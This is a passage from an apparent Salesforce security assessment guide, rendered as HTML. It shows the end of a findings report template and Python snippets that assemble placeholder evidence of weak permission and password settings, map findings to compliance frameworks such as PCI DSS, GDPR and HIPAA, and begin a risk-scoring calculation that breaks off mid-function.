</span><span id="__span-88-28"><a id="__codelineno-88-28" name="__codelineno-88-28" href="#__codelineno-88-28"></a><span class="k">-</span><span class="w"> </span>Potential financial impact
</span><span id="__span-88-29"><a id="__codelineno-88-29" name="__codelineno-88-29" href="#__codelineno-88-29"></a>
</span><span id="__span-88-30"><a id="__codelineno-88-30" name="__codelineno-88-30" href="#__codelineno-88-30"></a><span class="gu">### Remediation Steps</span>
</span><span id="__span-88-31"><a id="__codelineno-88-31" name="__codelineno-88-31" href="#__codelineno-88-31"></a><span class="k">1.</span> Immediate actions (workarounds)
</span><span id="__span-88-32"><a id="__codelineno-88-32" name="__codelineno-88-32" href="#__codelineno-88-32"></a><span class="k">2.</span> Short-term fixes
</span><span id="__span-88-33"><a id="__codelineno-88-33" name="__codelineno-88-33" href="#__codelineno-88-33"></a><span class="k">3.</span> Long-term security improvements
</span><span id="__span-88-34"><a id="__codelineno-88-34" name="__codelineno-88-34" href="#__codelineno-88-34"></a><span class="k">4.</span> Validation steps
</span><span id="__span-88-35"><a id="__codelineno-88-35" name="__codelineno-88-35" href="#__codelineno-88-35"></a>
</span><span id="__span-88-36"><a id="__codelineno-88-36" name="__codelineno-88-36" href="#__codelineno-88-36"></a><span class="gu">### References</span>
</span><span id="__span-88-37"><a id="__codelineno-88-37" name="__codelineno-88-37" href="#__codelineno-88-37"></a><span class="k">-</span><span class="w"> </span>Salesforce security documentation
</span><span id="__span-88-38"><a id="__codelineno-88-38" name="__codelineno-88-38" href="#__codelineno-88-38"></a><span class="k">-</span><span class="w"> </span>Industry best practices
</span><span id="__span-88-39"><a id="__codelineno-88-39" name="__codelineno-88-39" href="#__codelineno-88-39"></a><span class="k">-</span><span class="w"> </span>Compliance requirements
</span></code></pre></div></p>
<p><strong>Evidence Collection Script</strong>:
<div class="language-python highlight"><pre><span></span><code><span id="__span-89-1"><a id="__codelineno-89-1" name="__codelineno-89-1" href="#__codelineno-89-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">collect_security_evidence</span><span class="p">():</span>
</span><span id="__span-89-2"><a id="__codelineno-89-2" name="__codelineno-89-2" href="#__codelineno-89-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Automated evidence collection for security findings&quot;&quot;&quot;</span>
</span><span id="__span-89-3"><a id="__codelineno-89-3" name="__codelineno-89-3" href="#__codelineno-89-3"></a>    <span class="kn">import</span><span class="w"> </span><span class="nn">json</span>
</span><span id="__span-89-4"><a id="__codelineno-89-4" name="__codelineno-89-4" href="#__codelineno-89-4"></a>    <span class="kn">import</span><span class="w"> </span><span class="nn">datetime</span>
</span><span id="__span-89-5"><a id="__codelineno-89-5" name="__codelineno-89-5" href="#__codelineno-89-5"></a>
</span><span id="__span-89-6"><a id="__codelineno-89-6" name="__codelineno-89-6" href="#__codelineno-89-6"></a>    <span class="n">evidence</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-89-7"><a id="__codelineno-89-7" name="__codelineno-89-7" href="#__codelineno-89-7"></a>        <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span><span class="o">.</span><span class="n">isoformat</span><span class="p">(),</span>
</span><span id="__span-89-8"><a id="__codelineno-89-8" name="__codelineno-89-8" href="#__codelineno-89-8"></a>        <span class="s1">&#39;org_info&#39;</span><span class="p">:</span> <span class="p">{},</span>
</span><span id="__span-89-9"><a id="__codelineno-89-9" name="__codelineno-89-9" href="#__codelineno-89-9"></a>        <span class="s1">&#39;user_permissions&#39;</span><span class="p">:</span> <span class="p">{},</span>
</span><span id="__span-89-10"><a id="__codelineno-89-10" name="__codelineno-89-10" href="#__codelineno-89-10"></a>        <span class="s1">&#39;security_settings&#39;</span><span class="p">:</span> <span class="p">{},</span>
</span><span id="__span-89-11"><a id="__codelineno-89-11" name="__codelineno-89-11" href="#__codelineno-89-11"></a>        <span class="s1">&#39;vulnerable_code&#39;</span><span class="p">:</span> <span class="p">{},</span>
</span><span id="__span-89-12"><a id="__codelineno-89-12" name="__codelineno-89-12" href="#__codelineno-89-12"></a>        <span class="s1">&#39;data_exposure&#39;</span><span class="p">:</span> <span class="p">{}</span>
</span><span id="__span-89-13"><a id="__codelineno-89-13" name="__codelineno-89-13" href="#__codelineno-89-13"></a>    <span class="p">}</span>
</span><span id="__span-89-14"><a id="__codelineno-89-14" name="__codelineno-89-14" href="#__codelineno-89-14"></a>
</span><span id="__span-89-15"><a id="__codelineno-89-15" name="__codelineno-89-15" href="#__codelineno-89-15"></a>    <span class="c1"># Collect organizational information</span>
</span><span id="__span-89-16"><a id="__codelineno-89-16" name="__codelineno-89-16" href="#__codelineno-89-16"></a>    <span class="n">evidence</span><span class="p">[</span><span class="s1">&#39;org_info&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-89-17"><a id="__codelineno-89-17" name="__codelineno-89-17" href="#__codelineno-89-17"></a>        <span class="s1">&#39;org_id&#39;</span><span class="p">:</span> <span class="s1">&#39;REDACTED_ORG_ID&#39;</span><span class="p">,</span>
</span><span id="__span-89-18"><a id="__codelineno-89-18" name="__codelineno-89-18" href="#__codelineno-89-18"></a>        <span class="s1">&#39;instance&#39;</span><span class="p">:</span> <span class="s1">&#39;na123&#39;</span><span class="p">,</span>
</span><span id="__span-89-19"><a id="__codelineno-89-19" name="__codelineno-89-19" href="#__codelineno-89-19"></a>        <span class="s1">&#39;edition&#39;</span><span class="p">:</span> <span class="s1">&#39;Enterprise&#39;</span><span class="p">,</span>
</span><span id="__span-89-20"><a id="__codelineno-89-20" name="__codelineno-89-20" href="#__codelineno-89-20"></a>        <span class="s1">&#39;sandbox&#39;</span><span class="p">:</span> <span class="kc">False</span>
</span><span id="__span-89-21"><a id="__codelineno-89-21" name="__codelineno-89-21" href="#__codelineno-89-21"></a>    <span class="p">}</span>
</span><span id="__span-89-22"><a id="__codelineno-89-22" name="__codelineno-89-22" href="#__codelineno-89-22"></a>
</span><span id="__span-89-23"><a id="__codelineno-89-23" name="__codelineno-89-23" href="#__codelineno-89-23"></a>    <span class="c1"># Document permission vulnerabilities</span>
</span><span id="__span-89-24"><a id="__codelineno-89-24" name="__codelineno-89-24" href="#__codelineno-89-24"></a>    <span class="n">evidence</span><span class="p">[</span><span class="s1">&#39;user_permissions&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-89-25"><a id="__codelineno-89-25" name="__codelineno-89-25" href="#__codelineno-89-25"></a>        <span class="s1">&#39;over_privileged_users&#39;</span><span class="p">:</span> <span class="mi">15</span><span class="p">,</span>
</span><span id="__span-89-26"><a id="__codelineno-89-26" name="__codelineno-89-26" href="#__codelineno-89-26"></a>        <span class="s1">&#39;modify_all_data_users&#39;</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span>
</span><span id="__span-89-27"><a id="__codelineno-89-27" name="__codelineno-89-27" href="#__codelineno-89-27"></a>        <span class="s1">&#39;view_all_data_users&#39;</span><span class="p">:</span> <span class="mi">12</span><span class="p">,</span>
</span><span id="__span-89-28"><a id="__codelineno-89-28" name="__codelineno-89-28" href="#__codelineno-89-28"></a>        <span class="s1">&#39;guest_user_permissions&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;Read Contact&#39;</span><span class="p">,</span> <span class="s1">&#39;Read Account&#39;</span><span class="p">]</span>
</span><span id="__span-89-29"><a id="__codelineno-89-29" name="__codelineno-89-29" href="#__codelineno-89-29"></a>    <span class="p">}</span>
</span><span id="__span-89-30"><a id="__codelineno-89-30" name="__codelineno-89-30" href="#__codelineno-89-30"></a>
</span><span id="__span-89-31"><a id="__codelineno-89-31" name="__codelineno-89-31" href="#__codelineno-89-31"></a>    <span class="c1"># Security configuration issues</span>
</span><span id="__span-89-32"><a id="__codelineno-89-32" name="__codelineno-89-32" href="#__codelineno-89-32"></a>    <span class="n">evidence</span><span class="p">[</span><span class="s1">&#39;security_settings&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-89-33"><a id="__codelineno-89-33" name="__codelineno-89-33" href="#__codelineno-89-33"></a>        <span class="s1">&#39;password_policy&#39;</span><span class="p">:</span> <span class="p">{</span>
</span><span id="__span-89-34"><a id="__codelineno-89-34" name="__codelineno-89-34" href="#__codelineno-89-34"></a>            <span class="s1">&#39;min_length&#39;</span><span class="p">:</span> <span class="mi">8</span><span class="p">,</span>  <span class="c1"># Below recommended 12</span>
</span><span id="__span-89-35"><a id="__codelineno-89-35" name="__codelineno-89-35" href="#__codelineno-89-35"></a>            <span class="s1">&#39;complexity&#39;</span><span class="p">:</span> <span class="s1">&#39;Low&#39;</span><span class="p">,</span>
</span><span id="__span-89-36"><a id="__codelineno-89-36" name="__codelineno-89-36" href="#__codelineno-89-36"></a>            <span class="s1">&#39;lockout_threshold&#39;</span><span class="p">:</span> <span class="mi">10</span>  <span class="c1"># Above recommended 5</span>
</span><span id="__span-89-37"><a id="__codelineno-89-37" name="__codelineno-89-37" href="#__codelineno-89-37"></a>        <span class="p">},</span>
</span><span id="__span-89-38"><a id="__codelineno-89-38" name="__codelineno-89-38" href="#__codelineno-89-38"></a>        <span class="s1">&#39;session_security&#39;</span><span class="p">:</span> <span class="p">{</span>
</span><span id="__span-89-39"><a id="__codelineno-89-39" name="__codelineno-89-39" href="#__codelineno-89-39"></a>            <span class="s1">&#39;ip_locking&#39;</span><span class="p">:</span> <span class="kc">False</span><span class="p">,</span>
</span><span id="__span-89-40"><a id="__codelineno-89-40" name="__codelineno-89-40" href="#__codelineno-89-40"></a>            <span class="s1">&#39;timeout&#39;</span><span class="p">:</span> <span class="mi">480</span><span class="p">,</span>  <span class="c1"># 8 hours, above recommended 2</span>
</span><span id="__span-89-41"><a id="__codelineno-89-41" name="__codelineno-89-41" href="#__codelineno-89-41"></a>            <span class="s1">&#39;concurrent_sessions&#39;</span><span class="p">:</span> <span class="kc">True</span>
</span><span id="__span-89-42"><a id="__codelineno-89-42" name="__codelineno-89-42" href="#__codelineno-89-42"></a>        <span class="p">}</span>
</span><span id="__span-89-43"><a id="__codelineno-89-43" name="__codelineno-89-43" href="#__codelineno-89-43"></a>    <span class="p">}</span>
</span><span id="__span-89-44"><a id="__codelineno-89-44" name="__codelineno-89-44" href="#__codelineno-89-44"></a>
</span><span id="__span-89-45"><a id="__codelineno-89-45" name="__codelineno-89-45" href="#__codelineno-89-45"></a>    <span class="k">return</span> <span class="n">evidence</span>
</span><span id="__span-89-46"><a id="__codelineno-89-46" name="__codelineno-89-46" href="#__codelineno-89-46"></a>
</span><span id="__span-89-47"><a id="__codelineno-89-47" name="__codelineno-89-47" href="#__codelineno-89-47"></a><span class="k">def</span><span class="w"> </span><span class="nf">generate_executive_summary</span><span class="p">(</span><span class="n">findings</span><span class="p">):</span>
</span><span id="__span-89-48"><a id="__codelineno-89-48" name="__codelineno-89-48" href="#__codelineno-89-48"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Generate executive summary of security assessment&quot;&quot;&quot;</span>
</span><span id="__span-89-49"><a id="__codelineno-89-49" name="__codelineno-89-49" href="#__codelineno-89-49"></a>    <span class="n">summary</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-89-50"><a id="__codelineno-89-50" name="__codelineno-89-50" href="#__codelineno-89-50"></a>        <span class="s1">&#39;critical_findings&#39;</span><span class="p">:</span> <span class="nb">len</span><span class="p">([</span><span class="n">f</span> <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">findings</span> <span class="k">if</span> <span class="n">f</span><span class="o">.</span><span class="n">risk</span> <span class="o">==</span> <span class="s1">&#39;Critical&#39;</span><span class="p">]),</span>
</span><span id="__span-89-51"><a id="__codelineno-89-51" name="__codelineno-89-51" href="#__codelineno-89-51"></a>        <span class="s1">&#39;high_findings&#39;</span><span class="p">:</span> <span class="nb">len</span><span class="p">([</span><span class="n">f</span> <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">findings</span> <span class="k">if</span> <span class="n">f</span><span class="o">.</span><span class="n">risk</span> <span class="o">==</span> <span class="s1">&#39;High&#39;</span><span class="p">]),</span>
</span><span id="__span-89-52"><a id="__codelineno-89-52" name="__codelineno-89-52" href="#__codelineno-89-52"></a>        <span class="s1">&#39;medium_findings&#39;</span><span class="p">:</span> <span class="nb">len</span><span class="p">([</span><span class="n">f</span> <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">findings</span> <span class="k">if</span> <span class="n">f</span><span class="o">.</span><span class="n">risk</span> <span class="o">==</span> <span class="s1">&#39;Medium&#39;</span><span class="p">]),</span>
</span><span id="__span-89-53"><a id="__codelineno-89-53" name="__codelineno-89-53" href="#__codelineno-89-53"></a>        <span class="s1">&#39;low_findings&#39;</span><span class="p">:</span> <span class="nb">len</span><span class="p">([</span><span class="n">f</span> <span class="k">for</span> <span class="n">f</span> <span class="ow">in</span> <span class="n">findings</span> <span class="k">if</span> <span class="n">f</span><span class="o">.</span><span class="n">risk</span> <span class="o">==</span> <span class="s1">&#39;Low&#39;</span><span class="p">]),</span>
</span><span id="__span-89-54"><a id="__codelineno-89-54" name="__codelineno-89-54" href="#__codelineno-89-54"></a>        <span class="s1">&#39;total_findings&#39;</span><span class="p">:</span> <span class="nb">len</span><span class="p">(</span><span class="n">findings</span><span class="p">),</span>
</span><span id="__span-89-55"><a id="__codelineno-89-55" name="__codelineno-89-55" href="#__codelineno-89-55"></a>        <span class="s1">&#39;overall_risk&#39;</span><span class="p">:</span> <span class="s1">&#39;High&#39;</span><span class="p">,</span>  <span class="c1"># Based on critical/high findings</span>
</span><span id="__span-89-56"><a id="__codelineno-89-56" name="__codelineno-89-56" href="#__codelineno-89-56"></a>        <span class="s1">&#39;key_recommendations&#39;</span><span class="p">:</span> <span class="p">[</span>
</span><span id="__span-89-57"><a id="__codelineno-89-57" name="__codelineno-89-57" href="#__codelineno-89-57"></a>            <span class="s1">&#39;Implement MFA for all users&#39;</span><span class="p">,</span>
</span><span id="__span-89-58"><a id="__codelineno-89-58" name="__codelineno-89-58" href="#__codelineno-89-58"></a>            <span class="s1">&#39;Review and restrict administrative permissions&#39;</span><span class="p">,</span>
</span><span id="__span-89-59"><a id="__codelineno-89-59" name="__codelineno-89-59" href="#__codelineno-89-59"></a>            <span class="s1">&#39;Enable Platform Encryption for sensitive fields&#39;</span><span class="p">,</span>
</span><span id="__span-89-60"><a id="__codelineno-89-60" name="__codelineno-89-60" href="#__codelineno-89-60"></a>            <span class="s1">&#39;Strengthen password policies&#39;</span><span class="p">,</span>
</span><span id="__span-89-61"><a id="__codelineno-89-61" name="__codelineno-89-61" href="#__codelineno-89-61"></a>            <span class="s1">&#39;Implement IP restrictions&#39;</span>
</span><span id="__span-89-62"><a id="__codelineno-89-62" name="__codelineno-89-62" href="#__codelineno-89-62"></a>        <span class="p">]</span>
</span><span id="__span-89-63"><a id="__codelineno-89-63" name="__codelineno-89-63" href="#__codelineno-89-63"></a>    <span class="p">}</span>
</span><span id="__span-89-64"><a id="__codelineno-89-64" name="__codelineno-89-64" href="#__codelineno-89-64"></a>    <span class="k">return</span> <span class="n">summary</span>
</span></code></pre></div></p>
<h3 id="2-compliance-mapping">2. Compliance Mapping</h3>
<p><strong>Objective</strong>: Map identified vulnerabilities to relevant compliance frameworks.</p>
<p><strong>Framework Mapping</strong>:
<div class="language-python highlight"><pre><span></span><code><span id="__span-90-1"><a id="__codelineno-90-1" name="__codelineno-90-1" href="#__codelineno-90-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">map_findings_to_compliance</span><span class="p">():</span>
</span><span id="__span-90-2"><a id="__codelineno-90-2" name="__codelineno-90-2" href="#__codelineno-90-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Map security findings to compliance frameworks&quot;&quot;&quot;</span>
</span><span id="__span-90-3"><a id="__codelineno-90-3" name="__codelineno-90-3" href="#__codelineno-90-3"></a>
</span><span id="__span-90-4"><a id="__codelineno-90-4" name="__codelineno-90-4" href="#__codelineno-90-4"></a>    <span class="n">compliance_mapping</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-90-5"><a id="__codelineno-90-5" name="__codelineno-90-5" href="#__codelineno-90-5"></a>        <span class="s1">&#39;SOX&#39;</span><span class="p">:</span> <span class="p">{</span>
</span><span id="__span-90-6"><a id="__codelineno-90-6" name="__codelineno-90-6" href="#__codelineno-90-6"></a>            <span class="s1">&#39;applicable_controls&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;Access Controls&#39;</span><span class="p">,</span> <span class="s1">&#39;Change Management&#39;</span><span class="p">,</span> <span class="s1">&#39;Data Integrity&#39;</span><span class="p">],</span>
</span><span id="__span-90-7"><a id="__codelineno-90-7" name="__codelineno-90-7" href="#__codelineno-90-7"></a>            <span class="s1">&#39;violated_controls&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;SOX-ITG-01&#39;</span><span class="p">,</span> <span class="s1">&#39;SOX-ITG-03&#39;</span><span class="p">],</span>
</span><span id="__span-90-8"><a id="__codelineno-90-8" name="__codelineno-90-8" href="#__codelineno-90-8"></a>            <span class="s1">&#39;findings&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;Over-privileged users&#39;</span><span class="p">,</span> <span class="s1">&#39;Weak password policies&#39;</span><span class="p">]</span>
</span><span id="__span-90-9"><a id="__codelineno-90-9" name="__codelineno-90-9" href="#__codelineno-90-9"></a>        <span class="p">},</span>
</span><span id="__span-90-10"><a id="__codelineno-90-10" name="__codelineno-90-10" href="#__codelineno-90-10"></a>        <span class="s1">&#39;PCI_DSS&#39;</span><span class="p">:</span> <span class="p">{</span>
</span><span id="__span-90-11"><a id="__codelineno-90-11" name="__codelineno-90-11" href="#__codelineno-90-11"></a>            <span class="s1">&#39;applicable_controls&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;Access Control&#39;</span><span class="p">,</span> <span class="s1">&#39;Encryption&#39;</span><span class="p">,</span> <span class="s1">&#39;Network Security&#39;</span><span class="p">],</span>
</span><span id="__span-90-12"><a id="__codelineno-90-12" name="__codelineno-90-12" href="#__codelineno-90-12"></a>            <span class="s1">&#39;violated_controls&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;PCI-DSS-7&#39;</span><span class="p">,</span> <span class="s1">&#39;PCI-DSS-8&#39;</span><span class="p">],</span>
</span><span id="__span-90-13"><a id="__codelineno-90-13" name="__codelineno-90-13" href="#__codelineno-90-13"></a>            <span class="s1">&#39;findings&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;Unencrypted credit card fields&#39;</span><span class="p">,</span> <span class="s1">&#39;Weak authentication&#39;</span><span class="p">]</span>
</span><span id="__span-90-14"><a id="__codelineno-90-14" name="__codelineno-90-14" href="#__codelineno-90-14"></a>        <span class="p">},</span>
</span><span id="__span-90-15"><a id="__codelineno-90-15" name="__codelineno-90-15" href="#__codelineno-90-15"></a>        <span class="s1">&#39;GDPR&#39;</span><span class="p">:</span> <span class="p">{</span>
</span><span id="__span-90-16"><a id="__codelineno-90-16" name="__codelineno-90-16" href="#__codelineno-90-16"></a>            <span class="s1">&#39;applicable_controls&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;Data Protection&#39;</span><span class="p">,</span> <span class="s1">&#39;Access Rights&#39;</span><span class="p">,</span> <span class="s1">&#39;Data Breach&#39;</span><span class="p">],</span>
</span><span id="__span-90-17"><a id="__codelineno-90-17" name="__codelineno-90-17" href="#__codelineno-90-17"></a>            <span class="s1">&#39;violated_controls&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;GDPR-Art25&#39;</span><span class="p">,</span> <span class="s1">&#39;GDPR-Art32&#39;</span><span class="p">],</span>
</span><span id="__span-90-18"><a id="__codelineno-90-18" name="__codelineno-90-18" href="#__codelineno-90-18"></a>            <span class="s1">&#39;findings&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;PII exposure&#39;</span><span class="p">,</span> <span class="s1">&#39;Inadequate access controls&#39;</span><span class="p">]</span>
</span><span id="__span-90-19"><a id="__codelineno-90-19" name="__codelineno-90-19" href="#__codelineno-90-19"></a>        <span class="p">},</span>
</span><span id="__span-90-20"><a id="__codelineno-90-20" name="__codelineno-90-20" href="#__codelineno-90-20"></a>        <span class="s1">&#39;HIPAA&#39;</span><span class="p">:</span> <span class="p">{</span>
</span><span id="__span-90-21"><a id="__codelineno-90-21" name="__codelineno-90-21" href="#__codelineno-90-21"></a>            <span class="s1">&#39;applicable_controls&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;Administrative Safeguards&#39;</span><span class="p">,</span> <span class="s1">&#39;Physical Safeguards&#39;</span><span class="p">,</span> <span class="s1">&#39;Technical Safeguards&#39;</span><span class="p">],</span>
</span><span id="__span-90-22"><a id="__codelineno-90-22" name="__codelineno-90-22" href="#__codelineno-90-22"></a>            <span class="s1">&#39;violated_controls&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;HIPAA-164.308&#39;</span><span class="p">,</span> <span class="s1">&#39;HIPAA-164.312&#39;</span><span class="p">],</span>
</span><span id="__span-90-23"><a id="__codelineno-90-23" name="__codelineno-90-23" href="#__codelineno-90-23"></a>            <span class="s1">&#39;findings&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;Medical data exposure&#39;</span><span class="p">,</span> <span class="s1">&#39;Missing encryption&#39;</span><span class="p">]</span>
</span><span id="__span-90-24"><a id="__codelineno-90-24" name="__codelineno-90-24" href="#__codelineno-90-24"></a>        <span class="p">},</span>
</span><span id="__span-90-25"><a id="__codelineno-90-25" name="__codelineno-90-25" href="#__codelineno-90-25"></a>        <span class="s1">&#39;ISO_27001&#39;</span><span class="p">:</span> <span class="p">{</span>
</span><span id="__span-90-26"><a id="__codelineno-90-26" name="__codelineno-90-26" href="#__codelineno-90-26"></a>            <span class="s1">&#39;applicable_controls&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;A.9 Access Control&#39;</span><span class="p">,</span> <span class="s1">&#39;A.10 Cryptography&#39;</span><span class="p">,</span> <span class="s1">&#39;A.12 Operations Security&#39;</span><span class="p">],</span>
</span><span id="__span-90-27"><a id="__codelineno-90-27" name="__codelineno-90-27" href="#__codelineno-90-27"></a>            <span class="s1">&#39;violated_controls&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;A.9.1.1&#39;</span><span class="p">,</span> <span class="s1">&#39;A.9.2.1&#39;</span><span class="p">,</span> <span class="s1">&#39;A.10.1.1&#39;</span><span class="p">],</span>
</span><span id="__span-90-28"><a id="__codelineno-90-28" name="__codelineno-90-28" href="#__codelineno-90-28"></a>            <span class="s1">&#39;findings&#39;</span><span class="p">:</span> <span class="p">[</span><span class="s1">&#39;Access control weaknesses&#39;</span><span class="p">,</span> <span class="s1">&#39;Encryption gaps&#39;</span><span class="p">]</span>
</span><span id="__span-90-29"><a id="__codelineno-90-29" name="__codelineno-90-29" href="#__codelineno-90-29"></a>        <span class="p">}</span>
</span><span id="__span-90-30"><a id="__codelineno-90-30" name="__codelineno-90-30" href="#__codelineno-90-30"></a>    <span class="p">}</span>
</span><span id="__span-90-31"><a id="__codelineno-90-31" name="__codelineno-90-31" href="#__codelineno-90-31"></a>
</span><span id="__span-90-32"><a id="__codelineno-90-32" name="__codelineno-90-32" href="#__codelineno-90-32"></a>    <span class="k">return</span> <span class="n">compliance_mapping</span>
</span></code></pre></div></p>
<h3 id="3-risk-assessment-matrix">3. Risk Assessment Matrix</h3>
<p><strong>Objective</strong>: Quantify and prioritize security risks for business decision-making.</p>
<p><strong>Risk Calculation Framework</strong>:
<div class="language-python highlight"><pre><span></span><code><span id="__span-91-1"><a id="__codelineno-91-1" name="__codelineno-91-1" href="#__codelineno-91-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">calculate_risk_score</span><span class="p">(</span><span class="n">vulnerability</span><span class="p">):</span>
</span><span id="__span-91-2"><a id="__codelineno-91-2" name="__codelineno-91-2" href="#__codelineno-91-2"></a><span class="w">    </span><span class="sd">&quot;&quot;&quot;Calculate quantitative risk score&quot;&quot;&quot;</span>
</span><span id="__span-91-3"><a id="__codelineno-91-3" name="__codelineno-91-3" href="#__codelineno-91-3"></a>
</span><span id="__span-91-4"><a id="__codelineno-91-4" name="__codelineno-91-4" href="#__codelineno-91-4"></a>    <span class="c1"># Impact factors (1-5 scale)</span>
</span><span id="__span-91-5"><a id="__codelineno-91-5" name="__codelineno-91-5" href="#__codelineno-91-5"></a>    <span class="n">impact_factors</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-91-6"><a id="__codelineno-91-6" name="__codelineno-91-6" href="#__codelineno-91-6"></a>        <span class="s1">&#39;data_sensitivity&#39;</span><span class="p">:</span> <span class="n">vulnerability</span><span class="o">.</span><span class="n">data_sensitivity</span><span class="p">,</span>  <span class="c1"># 1-5</span>
</span><span id="__span-91-7"><a id="__codelineno-91-7" name="__codelineno-91-7" href="#__codelineno-91-7"></a>        <span class="s1">&#39;user_count_affected&#39;</span><span class="p">:</span> <span class="nb">min</span><span class="p">(</span><span class="n">vulnerability</span><span class="o">.</span><span class="n">affected_users</span> <span class="o">/</span> <span class="mi">100</span><span class="p">,</span> <span class="mi">5</span><span class="p">),</span>  <span class="c1"># Scale to 1-5</span>
</span><span id="__span-91-8"><a id="__codelineno-91-8" name="__codelineno-91-8" href="#__codelineno-91-8"></a>        <span class="s1">&#39;business_criticality&#39;</span><span class="p">:</span> <span class="n">vulnerability</span><span class="o">.</span><span class="n">business_impact</span><span class="p">,</span>  <span class="c1"># 1-5</span>
</span><span id="__span-91-9"><a id="__codelineno-91-9" name="__codelineno-91-9" href="#__codelineno-91-9"></a>        <span class="s1">&#39;compliance_impact&#39;</span><span class="p">:</span> <span class="n">vulnerability</span><span class="o">.</span><span class="n">compliance_risk</span>  <span class="c1"># 1-5</span>
</span><span id="__span-91-10"><a id="__codelineno-91-10" name="__codelineno-91-10" href="#__codelineno-91-10"></a>    <span class="p">}</span>
</span><span id="__span-91-11"><a id="__codelineno-91-11" name="__codelineno-91-11" href="#__codelineno-91-11"></a>
</span><span id="__span-91-12"><a id="__codelineno-91-12" name="__codelineno-91-12" href="#__codelineno-91-12"></a>    <span class="c1"># Likelihood factors (1-5 scale)</span>
</span><span id="__span-91-13"><a id="__codelineno-91-13" name="__codelineno-91-13" href="#__codelineno-91-13"></a>    <span class="n">likelihood_factors</span> <span class="o">=</span> <span class="p">{</span>
</span><span id="__span-91-14"><a id="__codelineno-91-14" name="__codelineno-91-14" href="#__codelineno-91-14"></a>        <span class="s1">&#39;exploitability&#39;</span><span class="p">:</span> <span class="n">vulnerability</span><span class="o">.</span><span class="n">exploitability</span><span class="p">,</span>  <span class="c1"># 1-5</span>
</span><span id="__span-91-15"><a id="__codelineno-91-15" name="__codelineno-91-15" href="#__codelineno-91-15"></a>        <span class="s1">&#39;attack_vector&#39;</span><span class="p">:</span> <span class="n">vulnerability</span><span class="o">.</span><span class="n">attack_complexity</span><span class="p">,</span>  <span class="c1"># 1-5</span>
</span><span id="__span-91-16"><a id="__codelineno-91-16" name="__codelineno-91-16" href="#__codelineno-91-16"></a>        <span class="s1">&#39;authentication_required&#39;</span><span class="p">:</span> <span class="mi">5</span> <span class="o">-</span> <span class="n">vulnerability</span><span class="o">.</span><span class="n">auth_bypass</span><span class="p">,</span>  <span class="c1"># Inverse scale</span>
</span><span id="__span-91-17"><a id="__codelineno-91-17" name="__codelineno-91-17" href="#__codelineno-91-17"></a>        <span class="s1">&#39;user_interaction&#39;</span><span class="p">:</span> <span class="mi">5</span> <span class="o">-</span> <span class="n">vulnerability</span><span class="o">.</span><span class="n">user_interaction</span>  <span class="c1"># Inverse scale</span>
</span><span id="__span-91-18"><a id="__codelineno-91-18" name="__codelineno-91-18" href="#__codelineno-91-18"></a>    <span class="p">}</span>
</span><span id="__span-91-19"><a id="__codelineno-91-19" name="__codelineno-91-19" href="#__codelineno-91-19"></a>
</span><span id="__span-91-20"><a id="__codelineno-91-20" name="__codelineno-91-20" href="#__codelineno-91-20"></a>    <span class="c1"># Calculate weighted scores</span>
</span><span id="__span-91-21"><a id="__codelineno-91-21" name="__codelineno-91-21" href="#__codelineno-91-21"></a>    <span class="n">impact_score</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">impact_factors</span><span class="o">.</span><span class="n">values</span><span class="p">())</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">impact_factors</span><span class="p">)</span>
</span><span id="__span-91-22"><a id="__codelineno-91-22" name="__codelineno-91-22" href="#__codelineno-91-22"></a>    <span class="n">likelihood_score</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">likelihood_factors</span><span class="o">.</span><span class="n">values</span><span class="p">())</span> <span class="o">/</span> <span class="nb">len</span><span class="p">(</span><span class="n">likelihood_factors</span><span class="p">)</span>
</span><span id="__span-91-23"><a id="__codelineno-91-23" name="__codelineno-91-23" href="#__codelineno-91-23"></a>
</span><span id="__span-91-24"><a id="__codelineno-91-24" name="__codelineno-91-24" href="#__codelineno-91-24"></a>    <span class="c1"># Overall risk score (1-25 scale)</span>
</span><span id="__span-91-25"><a id="__codelineno-91-25" name="__codelineno-91-25" href="#__codelineno-91-25"></a>    <span class="n">risk_score</span> <span class="o">=</span> <span class="n">impact_score</span> <span class="o">*</span> <span class="n">likelihood_score</span>
</span><span id="__span-91-26"><a id="__codelineno-91-26" name="__codelineno-91-26" href="#__codelineno-91-26"></a>
